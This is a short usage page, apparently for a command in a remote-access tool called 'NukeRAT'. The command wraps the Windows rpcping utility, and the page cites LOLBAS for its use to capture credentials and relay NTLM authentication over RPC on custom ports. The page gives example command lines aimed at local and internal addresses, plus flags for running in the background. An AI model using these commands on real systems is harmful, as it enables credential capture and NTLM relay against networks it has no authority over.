ABOUT
    Used to verify rpc connection. LOLBAS documents capture
    credentials on a non-standard port and relay a NTLM
    authentication over RPC (ncacn_ip_tcp) on a custom port.

USAGE:
    rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
    rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM

EXAMPLES:
    rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
    rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
